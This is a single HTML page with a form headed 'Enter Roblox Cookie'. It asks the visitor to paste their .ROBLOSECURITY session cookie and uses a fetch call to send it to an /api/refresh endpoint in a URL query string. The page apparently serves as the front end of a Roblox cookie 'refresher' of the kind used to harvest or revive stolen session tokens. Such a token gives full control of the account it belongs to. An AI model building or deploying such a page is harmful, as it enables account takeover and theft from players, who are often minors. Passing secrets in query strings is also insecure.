<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Roblox Cookie</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        input[type="text"] {
            padding: 10px;
            width: 300px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            padding: 10px;
            width: 100%;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Enter Roblox Cookie</h1>
        <form id="cookieForm">
            <label for="cookie">Enter .ROBLOSECURITY Cookie:</label><br>
            <input type="text" id="cookie" name="cookie" required><br><br>
            <button type="submit">Submit</button>
        </form>
        <p id="responseMessage"></p>
    </div>

    <script>
        document.getElementById('cookieForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            const cookie = document.getElementById('cookie').value;
            const responseMessage = document.getElementById('responseMessage');
            
            try {
                // Send the cookie to your API
                const response = await fetch(`/api/refresh?cookie=${cookie}`);
                const data = await response.json();

                if (response.ok) {
                    responseMessage.textContent = 'Cookie processed successfully!';
                } else {
                    responseMessage.textContent = `Error: ${data.error || 'Something went wrong'}`;
                }
            } catch (error) {
                responseMessage.textContent = 'Error: Unable to connect to the server.';
            }
        });
    </script>
</body>
</html>
